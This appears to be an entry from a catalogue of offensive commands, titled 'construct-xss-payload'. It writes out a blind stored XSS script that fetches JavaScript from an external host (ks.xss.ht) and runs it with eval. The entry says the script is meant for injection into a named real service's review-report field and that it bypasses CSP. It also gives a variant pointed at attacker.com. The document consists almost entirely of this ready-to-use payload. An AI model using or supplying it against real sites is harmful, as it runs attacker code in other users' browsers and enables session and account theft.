---
data: >-
  echo '<script>function b(){eval(this.responseText)};a=new
  XMLHttpRequest();a.addEventListener("load", b);a.open("GET",
  "//ks.xss.ht");a.send();</script>' > xss_payload.txt
tags:
  - xss
  - payload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.329Z'
id: 552fba88-b5dd-4a4f-a816-9e66fc85fde9
verified: false
validated: true
submitted: true
---
# construct-xss-payload

## Command

```bash
echo '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>' > xss_payload.txt
```

## Description

This command generates and saves a blind stored XSS payload to a file, designed for injection into Zomato's review report additional_text. It creates an XHR to load and eval external JS, bypassing CSP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the string | Yes |
| `> xss_payload.txt` | Redirects to file | Yes |

## Examples

### Basic Usage

```bash
echo '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>' > xss_payload.txt
```

### Advanced Usage

```bash
# Customize domain
DOMAIN="//attacker.com/js"; echo "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"$DOMAIN\");a.send();</script>" > payload.txt
```

## Expected Output

Creates xss_payload.txt with the payload string. Verify with cat xss_payload.txt; no errors if syntax is correct.

## Related

- [[Related Procedure]]
